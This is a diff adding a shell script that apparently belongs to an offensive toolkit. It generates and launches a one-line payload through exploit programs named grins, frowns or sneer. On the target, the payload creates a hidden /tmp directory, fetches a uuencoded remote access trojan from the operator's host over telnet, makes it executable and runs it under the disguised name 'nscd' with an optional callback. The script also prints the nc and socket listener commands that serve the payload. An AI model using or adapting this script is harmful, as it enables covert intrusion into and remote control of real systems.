@@ -1,0 +1,152 @@
+#!/bin/sh
+
+##########################################################
+### Generate & run the following script:
+### 	- script to upload nosy on target (oneshot.scr)
+### 	- run grins/frowns/whatever using the above script
+##########################################################
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+GS_OPTION=frowns
+RUN_FILE=nscd
+#CALLBACKPORT=
+
+LOCAL_IP_GUESS=`ifconfig -a | grep inet | grep -v grep | grep -v "127\.0\.0\.1" | cut -d " " -f 2`
+
+# Show usage and exit
+usage() {
+    echo ""
+#    echo "Before running this script, you first need to run the following:"
+#    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+#    echo "      (nc must be in your path; it's also run w/in this script)"
+#    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo "Using -c option requires local nosy client command as follows:"
+    echo "	nosyxxx -l <callbackPort>"
+    echo "You'll be prompted when to start it."
+    echo ""
+    echo "Your local IP(s) appears to be:"
+    echo $LOCAL_IP_GUESS
+    echo ""
+    echo "Usage: ${0} [options]"
+    echo "  -i <remoteIP>                (required)"
+    echo "  -g <grins|frowns|sneer>      def= $GS_OPTION"
+    echo "  -l <localIP>                 (required)"
+    echo "  -n <localPort>               (required)"
+    echo "  -c <callbackPort>            (no default)"
+    echo "  -D <remoteDir>               def= $DIR"
+    echo "  -s <remoteScriptName>        def= $SCRIPT"
+    echo "  -f <remoteRATName>           def= $RUN_FILE"
+    exit 1
+}
+
+#prompt for callback RAT listen
+callback() {
+	echo "You also need to start your RAT client in listen mode at this point."
+	echo "Choose your poison:"
+	echo ""
+	for i in `ls ../bin/nosy*cl*`; do
+	  echo "	$i -l $CALLBACKPORT"
+	done
+	echo ""
+}
+# There must be at least three arguments
+if [ ${#} -le 2 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    while getopts g:i:n:f:c:l:D: op; do
+	case $op in
+	g)  GS_OPTION="$OPTARG";;
+	i)  REMOTE_IP="$OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	c)  CALLBACKPORT="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	s)  SCRIPT="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+    [ -z "$LOCAL_PORT" ] && echo "Error: missing local PORT" && usage
+
+
+#following line is now unused
+EXTRA="${*}"
+
+#######/sbin/sh -c (mkdir /tmp/.X11R6; cd /tmp/.X11R6 && telnet hpw3 32177 </dev/console 2>/dev/null |uudecode && uncompress -f nscd.Z && chmod 777 nscd && PATH=. nscd;)&
+
+echo "Generating oneshot upload script." 
+
+[ ! -z "$CALLBACKPORT" ] && if [ $CALLBACKPORT -le 65000 -a ${CALLBACKPORT} -ge 1 ]; then
+
+	echo "RAT will call back on port $CALLBACKPORT."
+	CALLBACK="CIP=$LOCAL_IP CPORT=$CALLBACKPORT "
+else
+	CALLBACK=""
+fi
+#/sbin/sh -c (D=$DIR;	mkdir	\$D;	cd	\$D &&	telnet $LOCAL_IP $LOCAL_PORT </dev/console 2>/dev/null |uudecode && uncompress -f $RUN_FILE.Z && chmod 777 $RUN_FILE && PATH=. $CALLBACK$RUN_FILE ;)&
+cat > oneshot.scr << EOF
+/sbin/sh -c (mkdir	$DIR;	cd	$DIR &&	telnet $LOCAL_IP $LOCAL_PORT </dev/console 2>/dev/null |uudecode && uncompress -f $RUN_FILE.Z && chmod 777 $RUN_FILE && PATH=. $CALLBACK$RUN_FILE ;)&
+EOF
+
+echo "oneshot script is as follows: "
+echo "========"
+cat oneshot.scr
+echo "========"
+echo ""
+
+OOPS=`grep $RUN_FILE ../up/$RUN_FILE.uu`
+if [ ! "$OOPS" ]; then
+  echo "FATAL ERROR: ../up/$RUN_FILE.uu appears to contain file other than $RUN_FILE."
+  echo "\`grep $RUN_FILE ../up/$RUN_FILE.uu\`=\"$OOPS\""
+  echo ""
+  exit 1
+fi 
+
+echo "You now need to run \"socket\" or \"nc\" in a local window as follows:"
+echo ""
+echo "      socket -q -s $LOCAL_PORT	< ./$RUN_FILE.uu "
+echo "      (socket will die when its file xfer is completed)."
+echo "		-- OR --"
+echo "      cd ../up; ls -al $RUN_FILE.uu "
+echo "      nc -l -p $LOCAL_PORT    < ./$RUN_FILE.uu "
+echo "         (...and watch tcpdump)"
+echo ""
+
+[ ! -z "$CALLBACKPORT" ] && if [ ${CALLBACKPORT} -le 65000 -a ${CALLBACKPORT} -ge 1 ]; then
+    callback
+fi
+echo "About to run:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+
+echo "(Hit return when you've got these started)"
+read input
+
+
+echo "now running:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public
+
+echo "Looking to see if socket is still running locally"
+ps -eaf | grep -w socket | grep -v grep
+
+
+echo "Thank you for playing"
+
+### echo "removing intermediate scripts"
+### rm ./gr_upload.scr ./oneshot.scr ./gr_upload.uu 
+
+echo Done.
+echo
+echo "Don't forget to look for stray telnets running on target."
+echo "If there are you are totally hosed because you didn't use ftp."
